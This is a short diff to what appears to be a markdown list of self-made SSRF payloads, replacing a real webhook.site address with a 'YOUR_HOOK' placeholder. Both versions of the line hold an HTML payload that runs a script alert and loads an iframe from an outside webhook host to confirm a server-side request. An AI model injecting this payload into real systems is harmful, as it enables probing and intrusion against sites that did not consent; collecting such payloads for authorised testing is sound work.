@@ -43,7 +43,7 @@
 - Personally created SSRF payloads <br>
 
 ```html
-;//<!----><SCRIPT>alert(1);</SCRIPT><iframe src="https://webhook.site/8e16a463-4b8e-4cdf-ba16-e44cf0f320df"></iframe>
+;//<!----><SCRIPT>alert(1);</SCRIPT><iframe src="https://webhook.site/YOUR_HOOK"></iframe>
 ```
 
 <br>
